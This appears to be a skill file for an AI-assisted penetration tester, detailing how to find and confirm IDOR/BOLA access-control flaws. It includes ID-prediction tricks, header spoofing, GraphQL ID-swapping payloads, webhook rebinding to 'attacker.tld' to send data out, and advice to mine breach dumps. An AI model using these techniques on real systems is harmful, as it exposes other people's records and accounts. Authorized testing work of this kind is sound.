---
name: idor
description: IDOR/BOLA testing for object-level authorization failures — object-reference enumeration, the six-family BOLA taxonomy, two-account differential methodology, tenant boundaries, and confirmation via response/body cross-check against the true owner
---

# IDOR

Object-level authorization failures (BOLA/IDOR) leak or mutate one principal's records through requests that look byte-for-byte identical to a legitimate one from another principal. The confirmation is a differential — same request, two identities, one succeeds when it should not. IDOR is the object axis of authorization; the function axis (can this principal invoke this action at all) lives in `broken_function_level_authorization`. The highest-impact findings chain both: a privileged action (BFLA) applied to a foreign object id (IDOR). OWASP Top 10 2025 classifies IDOR under A01 Broken Access Control; the OWASP API Security Top 10 lists it as API1:2023.

## Attack Surface

**Scope**
- Horizontal access: another subject's objects of the same type (peer-to-peer)
- Vertical access: privileged objects/actions reachable by a lower role
- Cross-tenant access: break isolation boundaries in multi-tenant systems (the ASVS 5.0 V8.4.1 boundary)
- Cross-service access: token or context accepted by the wrong service

**Reference Locations**
- Paths, query params, JSON bodies, form-data, headers, cookies
- JWT claims, GraphQL arguments, WebSocket messages, gRPC messages

**Identifier Forms**
- Integers, UUID/ULID/CUID, Snowflake, slugs
- Composite keys (e.g., `{orgId}:{userId}`)
- Opaque tokens, base64/hex-encoded blobs

**Relationship References**
- parentId, ownerId, accountId, tenantId, organization, teamId, projectId, subscriptionId

**Expansion/Projection Knobs**
- `fields`, `include`, `expand`, `projection`, `with`, `select`, `populate`
- Often bypass authorization in resolvers or serializers

## BOLA Family Taxonomy

Six BOLA families cover the practical surface, taken from the 2026 empirical taxonomy of 84 confirmed HackerOne disclosures (Kaur, arXiv:2605.25865 — the paper reports 41.7% Action-Level Object and 11.9% vertical rates as its own benchmark). Use them as an organizing lens so you probe every family, not the one you have habits for:

- **Direct Object Reference** — `GET /orders/{id}`-shape read of another user's object via a swapped identifier. The classical class. Confirm with the two-account differential below.
- **Action-Level Object** — state-changing action on another user's object (`POST /orders/{id}/cancel`, `PATCH /users/{id}` role/email fields). Dominant class alongside Direct Object Reference; do not stop at reads. Every action verb (POST/PUT/PATCH/DELETE, GraphQL mutations, gRPC unary calls) needs its own two-account probe against another user's ID.
- **Tenant Isolation** — the boundary crossed is organization/workspace/tenant, not user-to-user. Selector is a header (`X-Tenant-ID`, `X-Org-ID`), a subdomain (`{tenant}.app.tld`), or an embedded slug (`/api/orgs/{tenant}/…`). ASVS 5.0 V8.4.1 (L2) is the canonical control — multi-tenant apps *must* use cross-tenant controls; anything else is a finding.
- **Workflow-Context** — authorization decision depends on a prior step, and the current step re-checks nothing. Payment intents, multi-stage approvals, wizard steps: create a resource in your context, mutate its owner mid-workflow, and finalize with the target's identity.
- **Chained Disclosure** — a read primitive leaks IDs that seed the next read. Emails, notifications, activity feeds, list endpoints, search suggestions, error strings, exports, and JS bundles routinely embed foreign object IDs. Chain: `GET /notifications` → parse `orderId` → `GET /orders/{orderId}`.
- **Object Rebinding** — write to an owned parent that re-parents a foreign child. `PATCH /invoices/{myInvoice}` with `{"customer_id":<victim>}` reassigns the invoice into the victim's inbox; `POST /shares` with `{"resource_id":<not-mine>}` binds a share to a foreign object. Look for foreign-key fields in write bodies.

Every finding is a member of one of these families; naming which one it is sharpens the fix and predicts the sibling bug ("we patched Direct Object Reference on `/orders/{id}` — did the corresponding Action-Level Object endpoints get the same predicate?").

## High-Value Targets

- Exports/backups/reporting endpoints (CSV/PDF/ZIP)
- Messaging/mailbox/notifications, audit logs, activity feeds
- Billing: invoices, payment methods, transactions, credits
- Healthcare/education records, HR documents, PII/PHI/PCI
- Admin/staff tools, impersonation/session management
- File/object storage keys (S3/GCS signed URLs, share links)
- Background jobs: import/export job IDs, task results
- Multi-tenant resources: organizations, workspaces, projects

## Reconnaissance

**Parameter Analysis**
- Pagination/cursors: `page[offset]`, `page[limit]`, `cursor`, `nextPageToken` (often reveal or accept cross-tenant/state)
- Directory/list endpoints as seeders: search/list/suggest/export often leak object IDs for secondary exploitation
- Find undocumented params with `arjun -u <url>` (GET) or `arjun -u <url> -m POST` —
  surfaces hidden filters like `?include_deleted=1`, `?as_user=…`, `?owner_id=…`
  that frequently widen the IDOR surface.

**Enumeration Techniques**
- Alternate types: `{"id":123}` vs `{"id":"123"}`, arrays vs scalars, objects vs scalars
- Edge values: null/empty/0/-1/MAX_INT, scientific notation, overflows
- Duplicate keys/parameter pollution: `id=1&id=2`, JSON duplicate keys `{"id":1,"id":2}` (parser precedence)
- Case/aliasing: userId vs userid vs USER_ID; alt names like resourceId, targetId, account
- Path traversal-like in virtual file systems: `/files/user_123/../../user_456/report.csv`

**UUID/Opaque ID Sources**
- Logs, exports, JS bundles, analytics endpoints, emails, public activity
- Time-based IDs (UUIDv1, ULID) may be guessable within a window

**Object Graph Discovery**
- Map the routes an app exposes before probing — an OpenAPI/Swagger `/openapi.json`, `/swagger.json`, `.well-known/openapi.json`, or a GraphQL introspection query surfaces the entire object graph. Where none is public, reconstruct from the client bundle: mobile app APKs, SPA JS chunks, and desktop-app resources routinely embed the full endpoint list plus expected payload shapes.
- List/search/index endpoints (`/users`, `/orgs/{id}/members`, `/projects?owner_id=`) advertise the object types and their canonical id parameter names — grep the app for `id`, `uuid`, `slug`, `key`, `guid`, `token` in path and body positions to seed the reference surface.
- Every foreign-key field in a write body is a candidate Object Rebinding target — grep the mobile/SPA bundle for object-graph field names (`ownerId`, `tenantId`, `customerId`, `assigneeId`, `parentId`, `shareTargetId`) and any body that carries one is a probe.
- Nested REST paths (`/orgs/{orgId}/projects/{projectId}/items/{itemId}`) advertise the containment hierarchy — the ID at each depth is independently swappable; the check often lives at only one depth.

**Legacy Route Shadowing**
- API versions coexist (`/api/v1`, `/api/v2`, `/api/mobile`, `/api/internal`) with different middleware chains — a v2 endpoint gated by a new authorization layer may have a v1 sibling that skips it. Grep the client bundle for older `/v1` prefixes and re-probe every ID-bearing endpoint under the older base
- Backup/staging path variants (`/api/v1/orders/{id}.bak`, `/api/orders/{id}?debug=1`, `/api/orders/{id}?_format=raw`) often bypass filtering layers by producing a shape the middleware does not recognize
- Case sensitivity: `/Orders/{id}` vs `/orders/{id}` — a reverse proxy may normalize one; the app the other
- Mobile-client-only routes: decompile the app or intercept mobile traffic to find endpoints the web client never emits — mobile-only routes often skip web-added authorization middleware

**OSINT & Corpus Priming**
- Pull leaked identifiers before probing: past bug bounty writeups, breach-forum dumps, GitHub search for repository-embedded env files, and archived versions of the public site via web.archive.org routinely surface real object IDs. A precomputed ID corpus turns the Chained Disclosure family into a first-round probe.
- For tenant discovery, brute the subdomain namespace of a multi-tenant SaaS (`{tenant}.app.tld`) with a wordlist of company names, plus certificate-transparency logs for `*.app.tld` — the enumerable set of tenant selectors defines the Tenant Isolation attack surface.
- Emails, invoice PDFs, share links, and mobile push-notification payloads frequently embed unencrypted identifiers; if you can obtain a single one for a foreign resource, the differential can be run without needing a valid list endpoint.

### Predictable Time-Based Identifiers

"Opaque" IDs are often structured — decode a sample before assuming they are
unguessable. Measured structure:

- **UUIDv1** encodes a 60-bit timestamp + a stable **node (the host MAC)** + a
  **clock sequence**. Two UUIDv1s from the same host share the node and
  clock_seq; only the timestamp moves, monotonically:
  ```
  3fbbf84a-a632-11f1-9cbe-000c2948b700   node=000c2948b700 clock_seq=7358
  3fbbf84b-a632-11f1-9cbe-000c2948b700   node=000c2948b700 clock_seq=7358  (2ms later)
  ```
  **Sandwich attack**: create your own object immediately before and after the
  victim's is created (e.g. an invite, a password-reset). The victim's UUIDv1
  timestamp is bracketed by your two known timestamps; brute the small
  remaining window (100 ns ticks) with the *fixed* node+clock_seq you already
  hold. The keyspace is minutes-to-milliseconds of ticks, not 122 bits.
- **ULID** is a 48-bit millisecond timestamp (first 10 Crockford-base32 chars)
  + 80 bits of randomness. The time prefix is fully predictable; monotonic
  generators also increment the random tail within a millisecond, so IDs
  minted close together are adjacent. Only the 80-bit random part resists
  guessing — but the *timestamp* alone often confirms existence/ordering.
- **Snowflake** (Twitter/Discord/Instagram-style) decodes to `ms-since-epoch
  << 22 | worker << 12 | sequence`. Given the (published) epoch you recover the
  exact creation time, the worker id, and a 0–4095 sequence — enumerate the
  sequence within a busy millisecond to sweep every object created then.
- **Auto-increment / short random** — classic integer IDs and short base62
  slugs enumerate directly; check for +1/-1 neighbours and low-entropy slugs.

Confirm the scheme from a captured ID, then decide: enumerable (integer,
Snowflake, ULID-ordering), bracketable (UUIDv1 sandwich), or genuinely random
(UUIDv4, 128-bit token) — the last is where you fall back to leaking IDs from
list/search/exports instead.

### Rate-Limit Signals as Enumeration Oracle

Rate limiters keyed per-user can leak existence. A `429 Too Many Requests` triggered when *your* probe crosses a per-target quota threshold confirms the target exists (the target's counter is what's being rate-limited). A slower `Retry-After: 60` for foreign IDs than for owned tells you the target's tier or quota, which is disclosure of a config attribute even when the object itself is masked.

### Framework Default PK Predictability — Measured

Every mainstream backend framework's greenfield default is a sequential integer autoincrement; UUID/ULID/opaque IDs are always an opt-in. Measured 2026-09-29 in `zen_runs/batch5-artifacts/measurements/`:

| Framework (measured) | Idiomatic default | Emitted DDL | First rows | Primitive |
| --- | --- | --- | --- | --- |
| Django 6.1.1 | `DEFAULT_AUTO_FIELD = BigAutoField` | `"id" integer NOT NULL PRIMARY KEY AUTOINCREMENT` | `[(1,...),(2,...),(3,...)]` | ±1 walk |
| Rails / ActiveRecord 8.1.4 | `create_table :items do \|t\| …` | `id INTEGER` primary key (rowid) | `[[1,...],[2,...],[3,...]]` | ±1 walk |
| Laravel / Illuminate 13.34 | `$table->id();` | MySQL grammar: `bigint unsigned auto_increment`; SQLite: `integer primary key autoincrement` | (grammar-emitted) | ±1 walk |

Two consequences: (1) a response with `"id": 1834712` fingerprints a Django-BigAutoField / Rails-integer / Laravel-bigIncrements shape and admits the ±k neighborhood walk below. (2) A single captured owner-object ID plus a decrement is a first-order enumeration probe against any of these — the exact primitive behind the McHire exposure (Carroll & Curry, 2025-07, ian.sh/mcdonalds — ~64M applicant records reached via decrementing a `leadId` integer). The finding is the enumeration primitive, not the specific value.

### Enumeration Probes

Two independent signals decide whether an object endpoint is enumerable — run both against every discovered `GET /X/{id}` shape:

- **Numeric-only fingerprint** — a captured identifier that is entirely numeric (integer, Snowflake, sequence-in-Snowflake) is enumerable in principle. Confirm by fetching the ID's ±1/±10/±100 neighbours and observing whether the response distinguishes owned/foreign objects (200 with data vs 200-empty vs 403/404). AuthProbe (Barach, arXiv:2607.20574) formalizes this as the first of its two enumeration signals.
- **±k neighborhood walk** — starting from an attacker-owned ID `A`, walk ±1 through the neighborhood until you hit a response whose body identifier does not match yours. That first non-self read is the finding: same predicate, same shape, different owner. The walk is bounded (few hundred requests) and the primitive is what surfaced McHire.

A confirmed enumeration primitive alone is not the same as a confirmed BOLA — it says the identifier is guessable, not that authorization is missing. The BOLA itself is confirmed by the response cross-check under **Validation** below.

## Key Vulnerabilities

### Horizontal & Vertical Access

- Swap object IDs between principals using the same token to probe horizontal access
- Repeat with lower-privilege tokens to probe vertical access
- Target partial updates (PATCH, JSON Patch/JSON Merge Patch) for silent unauthorized modifications

### Bulk & Batch Operations

- Batch endpoints (bulk update/delete) often validate only the first element; include cross-tenant IDs mid-array
- CSV/JSON imports referencing foreign object IDs (ownerId, orgId) may bypass create-time checks

### Secondary IDOR (Chained Disclosure)

- Use list/search endpoints, notifications, emails, webhooks, and client logs to collect valid IDs
- Fetch or mutate those objects directly
- Pagination/cursor manipulation to skip filters and pull other users' pages

### Job/Task Objects

- Access job/task IDs from one user to retrieve results for another (`export/{jobId}/download`, `reports/{taskId}`)
- Cancel/approve someone else's jobs by referencing their task IDs

### File/Object Storage

- Direct object paths or weakly scoped signed URLs
- Attempt key prefix changes, content-disposition tricks, or stale signatures reused across tenants
- Replace share tokens with tokens from other tenants; try case/URL-encoding variations
- **Presigned-URL primitives**: S3/GCS/Azure presigned URLs sign the exact resource path; a scheme where the URL leaks in emails, JS bundles, or share links exposes reads of that exact object for the signature's remaining TTL. Two moves: (1) reuse the same signature against `?versionId=` older versions or against `?response-content-disposition=attachment` overrides; (2) swap the resource path in the URL and observe whether the signature is checked against the requested path (some proxies re-sign upstream and drop the path binding).
- **Bucket-key structure as leak**: keys under `users/{userId}/attachments/{objId}` or `orgs/{orgSlug}/exports/{ts}.csv` expose the object graph in the key namespace; a directory-list on the bucket (open bucket) or an S3 `?list-type=2&prefix=users/` API leak enumerates every object without ever touching the app.
- **Content-Type / Range abuse**: request the same signed URL with `Range: bytes=0-0` and confirm 206; the tenant that owns the object may have a distinct byte-range policy that leaks contents piecewise past a whole-file gate.

### GraphQL

- Enforce resolver-level checks: do not rely on a top-level gate
- Verify field and edge resolvers bind the resource to the caller on every hop
- Abuse batching/aliases to retrieve multiple users' nodes in one request
- Global node patterns (Relay): decode base64 IDs and swap raw IDs
- Overfetching via fragments on privileged types

```graphql
query IDOR {
  me { id }
  u1: user(id: "VXNlcjo0NTY=") { email billing { last4 } }
  u2: node(id: "VXNlcjo0NTc=") { ... on User { email } }
}
```

Relay global IDs are `base64("Type:rawId")` — decode, mutate, re-encode:
`VXNlcjo0NTY=` → `User:456`, `VXNlcjo0NTc=` → `User:457`, `T3JkZXI6MTAw` →
`Order:100`. Two IDOR moves fall out: (1) increment/swap the **rawId**
(`User:456`→`User:457`) and refetch via the universal `node(id:)` field, which
resolves *any* type and frequently skips the per-type resolver's ownership
check; (2) swap the **Type** to reach an object class the top-level query never
exposed (`User:456`→`Invoice:456`). Also tamper connection **cursors** (usually
base64 of an offset or the last node's id) to page past a tenant filter, and
use `... on PrivilegedType` inline fragments on `node` to overfetch fields the
typed query would have gated. GraphQL Global IDs (GIDs) are called out as a
recurring exploitation pattern across major platforms in Kaur's 2026 taxonomy;
the transformation to raw ID is deterministic and the ownership check often
lives at the specific-type resolver, not at `node`. Load `graphql` for the full
protocol surface (introspection, `_entities` federation, batching limits); the
ownership-binding angle is the IDOR-specific part above.

### Microservices & Gateways

- Token confusion: token scoped for Service A accepted by Service B due to shared JWT verification but missing audience/claims checks
- Trust on headers: reverse proxies or API gateways injecting/trusting headers like `X-User-Id`, `X-Organization-Id`; try overriding or removing them
- Context loss: async consumers (queues, workers) re-process requests without re-checking authorization

### Multi-Tenant (Tenant Isolation)

- Probe tenant scoping through headers, subdomains, and path params (`X-Tenant-ID`, org slug)
- Try mixing org of token with resource from another org
- Test cross-tenant reports/analytics rollups and admin views which aggregate multiple tenants
- Search/analytics/reporting endpoints frequently aggregate across a tenant filter that is applied at UI or edge, not at the query layer — a direct API call with an omitted or contradictory tenant selector often returns rows from every tenant

### Object Rebinding

The primitive is a write endpoint that lets a caller change *which object owns the resource* via a foreign-key field the request accepts:

- Update endpoints that accept a foreign-key field in the body — swap `customer_id`, `owner_id`, `tenant_id`, `project_id`, `share_target_id` to a value you do not own, and confirm the resource re-parents into the victim's namespace
- Nested resource creation (`POST /invoices/{id}/attachments`) that binds the child to the parent path but accepts a body-level `invoice_id` override
- Share/invite/notification recipient fields — `POST /shares` with `{"resource_id": <foreign>}` or `POST /invites` with a `target_org_id` re-directs the primitive at a foreign object
- Integration/webhook target rewriting — `PATCH /integrations/{myIntegration}` with `{"callback_url": "attacker.tld", "resource_id": <foreign>}` binds the attacker's callback to a foreign resource's events (this is the IDOR half of the SSRF/webhook chain — load `ssrf` for the delivery half)
- Any endpoint whose body may carry a UUID field the request-line path does not: parse the model shape and look for over-accepted fields (this is the mass-assignment / IDOR overlap; load `mass_assignment` for the write-side amplifier)

### Workflow-Context

Multi-stage flows re-validate at every step or nowhere. Where authorization is decided at step 1 and step 2 re-uses the state, the primitive is to mutate the actor mid-flow:

- Payment/checkout intents: initiate the intent under your identity, swap the identifier or actor claim before capture, watch the money credit to the victim
- Multi-step wizards: create an object as yourself, mutate its owner on the "review" step, complete on the "submit" step under the victim's identity
- Two-phase commit / draft-then-publish: draft under yourself, transfer ownership, publish — the publish flow reads the object's owner rather than the caller's

### Prototype/Test Environments

- Staging, uat, preview, feature-branch deploys frequently reuse production identifiers with weaker authorization
- Debug/admin endpoints (`/debug`, `/actuator`, `/rails/info`, `/_dashboard`) exposed on staging leak IDs and let you invoke actions across accounts

### WebSocket

- Authorization per-subscription: ensure channel/topic names cannot be guessed (`user_{id}`, `org_{id}`)
- Subscribe/publish checks must run server-side, not only at handshake
- Try sending messages with target user IDs after subscribing to own channels
- Concrete probe: connect, `SUBSCRIBE {"channel":"user.{VICTIM_ID}.events"}` — an ACK response instead of an error is the finding. If the app uses Phoenix, ActionCable, socket.io rooms, or a similar named-channel abstraction, guess the naming pattern from your own channel URL and swap the identifier
- Second-order: submit a message under your own channel whose payload contains a foreign object reference (`{"action":"delete","targetId":<foreign>}`) — the handler may re-authorize on the *channel* not on the *payload*

### gRPC

- Direct protobuf fields (`owner_id`, `tenant_id`) often bypass HTTP-layer middleware
- Validate references via grpcurl with tokens from different principals

### Integrations

- Webhooks/callbacks referencing foreign objects (e.g., `invoice_id`) processed without verifying ownership
- Third-party importers syncing data into wrong tenant due to missing tenant binding

## Detection Signals

A candidate does not need a full two-account probe to justify the follow-up work. These signals warrant escalating to the differential:

- **Object endpoints without list-level filters**: `GET /objects/{id}` exists but `GET /objects` returns *your* objects — the model is per-object gated but the code path is a shared handler. Every such endpoint deserves the swap.
- **Response includes a normalization field**: a body that includes both the requested ID and a normalized/derived form (`"id": 42, "normalized_id": "user_42"`) often reveals internal identity flow that admits identifier substitution across the two forms.
- **Bulk endpoints that don't say how many items were denied**: `POST /orders/bulk-approve` responding `{"approved": 10}` with a request of 10 items where some should have been denied. Silent per-item skip is the anti-pattern — cross-tenant IDs may have been processed.
- **`_id`-shape fields in write bodies you did not put there**: intercept the client, drop into repeater, and confirm the body carries a foreign-key field that the UI does not seem to expose. Every such field is a candidate Object Rebinding.
- **Error text that distinguishes owned/foreign**: `"Order 123 not found"` for a foreign ID versus `"Not authorized"` for a foreign ID — the first shape leaks existence, the second may still leak existence via timing/size. Both are candidates.
- **Two response shapes for the same status code**: a 200 with `{...}` for owned objects and a 200 with `{}` or `null` for foreign — silent enforcement. Compare against the ground-truth owner's fetch before ruling it out; if the foreign fetch actually contains data (even a metadata field), it is a leak.
- **`X-User-Id`/`X-Tenant-Id` reflected back in responses**: the gateway is passing an identity hint downstream; the app may be trusting it as authoritative. Send a spoofed value under a valid token; if the reflected value changes, the app read the header.
- **Sequential integer IDs in list responses**: fingerprint the sequence (Django BigAutoField / Rails integer / Laravel bigIncrements per the measured table). A sequence hints at greenfield defaults and an ID space that fits the ±k walk.
- **GraphQL responses that carry `id: "<base64>"`**: decode with `atob`; if it deserializes to `Type:rawId`, the app is on Relay and every rawId in the same Type namespace is directly probable via `node(id:)`.
- **Signed URL parameters visible in traffic**: an `X-Amz-Signature`, `sig=`, `signature=` embedded in a URL is a candidate for signature reuse across tenants (the signature covers the resource path — try the same signature against a foreign path; try the same path with a stale signature from another tenant).

## Bypass Techniques

**Parser & Transport**
- Content-type switching: `application/json` ↔ `application/x-www-form-urlencoded` ↔ `multipart/form-data`
- Method tunneling: `X-HTTP-Method-Override`, `_method=PATCH`; or using GET on endpoints incorrectly accepting state changes
- JSON duplicate keys/array injection to bypass naive validators

**Parameter Pollution**
- Duplicate parameters in query/body to influence server-side precedence (`id=123&id=456`); try both orderings
- Mix case/alias param names so gateway and backend disagree (userId vs userid)

**Cache & Gateway**
- CDN/proxy key confusion: responses keyed without Authorization or tenant headers expose cached objects to other users
- Manipulate Vary and Accept headers
- Redirect chains and 304/206 behaviors can leak content across tenants

**Race Windows**
- Time-of-check vs time-of-use: change the referenced ID between validation and execution using parallel requests

**Blind Channels**
- Use differential responses (status, size, ETag, timing) to detect existence
- Error shape often differs for owned vs foreign objects
- HEAD/OPTIONS, conditional requests (`If-None-Match`/`If-Modified-Since`) can confirm existence without full content

**Header Trust and Precedence**
- Reverse-proxy-injected identity: `X-User-Id`, `X-Authenticated-User`, `X-Real-User`, `X-Organization-Id`, `X-Tenant-ID`. Send the request with a low-priv token and an overridden identity header — if the app trusts the header, the primitive is now full account impersonation
- Contradiction: send *both* a valid token and a conflicting header; observe which the app trusts. Header trust in the presence of a token is a first-class finding
- `Host` and `X-Forwarded-Host` splits: a Host of one tenant with a token from another routes the request through the wrong tenant's middleware
- `X-Forwarded-For` and `True-Client-IP` in IP-allowlist checks — spoof the header to reach an IP-gated admin endpoint from an ineligible source

**Second-Order Bypass**
- Store a foreign identifier as a value on a resource *you* own (a comment, a profile field, a webhook payload) and have the app process it in a background job that runs without your identity — the queue-consumer often re-fetches with elevated context
- Import/export: upload a CSV/JSON that references foreign object IDs; the importer resolves them under the service identity, not yours

## Chaining

Model each chain hop as a precondition (what capability must exist to reach the primitive) and a postcondition (what capability this primitive grants). Route by filename.

**Upstream — preconditions granted by other primitives (predecessor.postcondition → IDOR.precondition):**

- `authentication_jwt` → *any low-privilege session*: an IDOR probe needs at least one authenticated identity and typically a second one to differ against. Broken registration, credential-stuffable auth, or session-fixation surfaces gate the ability to run the two-account probe from `authentication_jwt`.
- `ssrf` → *internal-only endpoint reachability*: some object endpoints (internal admin APIs, per-service RPC gateways) are unreachable from the internet. An SSRF that hits the internal DNS/loopback surfaces them; then the IDOR probe fires from the SSRF's proxy point. Load `ssrf` for the reachability primitive; do not conflate reachability with the IDOR itself.
- `information_disclosure` → *foreign object identifiers*: OSINT, log/backup exposure, JS bundle constants, GraphQL introspection, and error-message ID leaks feed the Chained Disclosure family above.
- `path_traversal_lfi_rfi` → *file-name / object-key exposure*: a traversal that reveals an S3 key prefix or storage path is the precondition for a subsequent signed-URL / storage IDOR.
- `csrf` → *cross-user request delivery* (for the reverse chain: XSS/CSRF forces the victim to issue a request; then an IDOR-shape body accessing the attacker's resource re-parents it into the victim's account — Object Rebinding delivered via CSRF).

**Downstream — capabilities granted by IDOR (IDOR.postcondition → successor.precondition):**

- IDOR read → `information_disclosure`: any confirmed cross-account read is disclosure at the impact tier the read carries (PII, PHI, PCI, credentials in returned fields).
- IDOR write → `mass_assignment`: an Object Rebinding or Action-Level Object write often over-accepts fields; the primitive is now foreign-object writes with attacker-controlled body shape. Load `mass_assignment`.
- IDOR on user record → `authentication_jwt` (session/credential material): reading a user's active tokens/reset-token/password-hash converts the IDOR into full account takeover.
- IDOR on file/object store → `path_traversal_lfi_rfi`: signed-URL forgery, key-prefix substitution, cross-tenant object listing.
- IDOR on stored-content field → `xss` (stored/persistent): writing HTML/JS into a foreign user's profile, note, or shared-doc field executes in that user's DOM; load `xss` for the render-context exploitation.
- IDOR on webhook/callback registration → `ssrf` / `open_redirect`: an attacker-controlled callback URL bound to a foreign object exfiltrates that object's content to attacker infrastructure or steers the follow-up call.
- IDOR + `broken_function_level_authorization`: the two often chain — a BFLA on `/admin/*` combined with an IDOR-shape body parameter (e.g. an admin `impersonate_user_id`) is a full-tenant takeover. Load `broken_function_level_authorization` for the function-axis half.
- IDOR on file storage → `insecure_file_uploads`: replacing a foreign object's associated file with a poisoned one is the write-side variant.

Chains are reachability/enablement paths — a downstream capability is only *reachable* through the IDOR, not automatically produced by it. Confirm each hop's own preconditions before claiming the chain end-to-end.

**Composite chains — worked examples:**

- **Chained Disclosure → Direct Object Reference → Account Takeover.** `GET /notifications` under user A returns notification payloads that embed `resetTokenId` for user B (Chained Disclosure primitive). `GET /password-resets/{resetTokenId}` under user A returns user B's reset token (Direct Object Reference against a security-critical object). `POST /password-resets/{resetTokenId}/complete` under user A with `{"new_password":"..."}` completes B's reset. The final step routes through `authentication_jwt` because the postcondition is a valid session as B.
- **Enumeration → Object Rebinding → Cross-Tenant CSRF-in-the-Product.** Numeric fingerprint on `POST /webhooks` reveals sequential `id`. `PATCH /webhooks/{sequential}` with `{"callback_url":"attacker.tld","tenant_id":<victim-tenant>}` re-parents an attacker-controlled callback into the victim tenant (Object Rebinding). Every event in the victim tenant fires against the attacker's URL — an SSRF-shaped exfiltration primitive built out of two IDOR moves; load `ssrf` for the receive-side.
- **Tenant Isolation → BFLA.** A Tenant Isolation bypass reaches an admin endpoint gated only by the tenant selector (`/admin/*` behind `X-Tenant-ID`) rather than by role. The primitive now hands the caller admin-in-victim-tenant capability without any function-level check — load `broken_function_level_authorization` for the function-axis exploitation.
- **Workflow-Context → IDOR write.** Initiate a payout under yourself, mutate `recipient_account_id` to a foreign account on the "review" step, submit. The submit endpoint reads the intent's recipient rather than the caller's — money moves.

## Testing Methodology

The canonical differential is the **two-account parallel-session** methodology OWASP WSTG-ATHZ-04 prescribes: hold at least two accounts with distinct owned objects and functions, keep both sessions live, and swap identifiers or session tokens between them. The alternative — brute-guessing IDs from one account — misses the entire Tenant Isolation, Object Rebinding, and Chained Disclosure surface. WSTG names two accounts as the minimum and "often more" (three-way with an unauthenticated column, four-way with a lower-privilege role) as the practical setup.

1. **Build matrix** — Subject × Object × Action matrix (who can do what to which resource). Include tenant/org as a subject dimension whenever the app has one.
2. **Obtain principals** — At least two peer users, one lower-privilege, one admin, and (for multi-tenant apps) at least two tenants; keep each account's cookie/token in labelled slots.
3. **Map object references** — WSTG-ATHZ-04 explicit precondition: enumerate every location where user input references an object (path, query, JSON, header, GraphQL variable, WebSocket message). Do this before probing — running a differential without the map misses the second-order surface.
4. **Collect IDs** — Capture at least one valid object ID per principal from list/search/export/notification endpoints. Retain both raw and any transformed forms (Relay `base64("Type:id")`, hashids, signed refs).
5. **Cross-account and cross-tenant differential** — Fire the same request under identity A with identity B's identifier; then identity B with identity A's identifier; then a third principal against both. For multi-tenant apps, repeat with tenant selector swaps (header, subdomain, path segment) while holding the token constant. This surfaces the Direct Object Reference, Action-Level Object, and Tenant Isolation families.
6. **Transport variation** — Repeat every probe across web, mobile, API, GraphQL, WebSocket, gRPC. Authorization middleware often differs by transport (`X-HTTP-Method-Override`, GraphQL resolvers, gRPC interceptors); a `403` on REST does not mean the GraphQL mutation is gated.
7. **Consistency check** — Same rule must hold regardless of transport, content-type, serialization, or gateway. The finding is a differential across transports even more than across accounts.
8. **Write-side probes** — Do not stop at reads. Every PATCH/PUT/DELETE and every GraphQL mutation gets the same two-account swap; run the Object Rebinding probe (foreign FK in a body) on every write endpoint.
9. **Multi-tenant selector matrix** — for every tenant-scoped endpoint, tabulate (my-tenant-selector, my-token) × (foreign-tenant-selector, my-token) × (my-tenant-selector, foreign-token) × (foreign-tenant-selector, foreign-token). The interior cells surface the "gateway trusts selector, service trusts token, they disagree" bugs that a single-vector test misses.
10. **Blind confirmation** — if the response is a redirect, an empty envelope, or intentionally obscured, confirm existence with the ETag/Last-Modified/response-size differential rather than the body. A foreign ID whose HEAD returns 200 with a nonzero Content-Length is disclosure of existence regardless of body content.

## Validation

The confirmation signal (paraphrased from AuthProbe's confirmation predicate — Barach, arXiv:2607.20574): a request under principal *A* against object *o* owned by principal *B* is a confirmed cross-account read when (i) the response status indicates success (2xx), (ii) the returned body's identifier field equals *o*'s identifier, and (iii) the body content matches a ground-truth fetch of *o* by its true owner *B*. Any two of the three still leaves a false positive on the table — soft-privatized data, silent authorization that returns 2xx-empty, or misleading identifier echoes. Cross-check all three.

1. Demonstrate access to an object not owned by the caller (content or metadata) with the ground-truth cross-check above
2. Show the same request fails with appropriately enforced authorization when corrected — ideally by a real fix commit or a role change, not by a "does not repro" claim
3. Prove cross-channel consistency: same unauthorized access via at least two transports (e.g., REST and GraphQL) — a REST-only finding often has an unpatched GraphQL sibling or vice versa
4. Document tenant boundary violations (if applicable) against ASVS 5.0 V8.4.1 (multi-tenant cross-tenant controls, L2); note the exact selector crossed (header, subdomain, path segment)
5. Provide reproducible steps and evidence (requests/responses for owner vs non-owner)

The relevant ASVS 5.0 anchors (edition 5.0.0, tag `v5.0.0_release`, published 2025-05-30): V8.2.2 (L1) explicitly names IDOR and BOLA and requires data-specific access to be restricted to consumers with explicit permissions to specific data items; V8.3.1 (L1) requires authorization enforcement at a trusted service layer that untrusted consumers cannot manipulate (client-side gates alone are the finding); V8.4.1 (L2) is the multi-tenant boundary control. A response satisfying the confirmation predicate above under a lower-privileged or foreign-tenant principal is a direct violation of the relevant V8 control.

## False Positives

- Public/anonymous resources by design
- Soft-privatized data where content is already public
- Idempotent metadata lookups that do not reveal sensitive content
- Correct row-level checks enforced across all channels
- Empty array / null returned for another user's resource — silent enforcement, not exposure; compare against the owner's view to confirm the data is actually missing rather than just hidden from the response shape
- 2xx response with a *different* identifier in the body — the API silently coerced the request back to the caller's own scope (auto-scoping); the returned data is the caller's, not the victim's. The AuthProbe confirmation predicate's third clause exists to reject exactly this shape.
- Cache hit of a public resource under an odd cache key — the identifier looks foreign but the underlying resource is a public asset. Repeat with `Cache-Control: no-cache` and confirm from the origin.

## Impact

- Cross-account data exposure (PII/PHI/PCI)
- Unauthorized state changes (transfers, role changes, cancellations)
- Cross-tenant data leaks violating contractual and regulatory boundaries
- Regulatory risk (GDPR/HIPAA/PCI), fraud, reputational damage
- Incident-response cost of a confirmed cross-account BOLA is typically dominated by the enumeration scale, not the per-record impact — the McHire exposure (Carroll & Curry, 2025-07) crossed ~64M records via a single integer decrement walk. Rank findings by the size of the ID space the primitive walks, not the sensitivity of the single record it demonstrates

## Pro Tips

1. Always test list/search/export endpoints first; they are rich ID seeders and drive the Chained Disclosure family.
   A single list endpoint that leaks foreign IDs turns every downstream read into a one-shot probe rather than a brute.
2. Build a reusable ID corpus from logs, notifications, emails, and client bundles.
   A single OSINT sweep often prefills the Chained Disclosure lane before you touch the app; persist the corpus so subsequent tests against the same target start with a warm ID inventory.
3. Toggle content-types and transports; authorization middleware often differs per stack.
   A finding blocked on JSON often reappears when the same request is sent as multipart or with `X-HTTP-Method-Override`.
4. In GraphQL, validate at resolver boundaries; never trust parent auth to cover children — and always test the universal `node(id:)` field alongside the typed query.
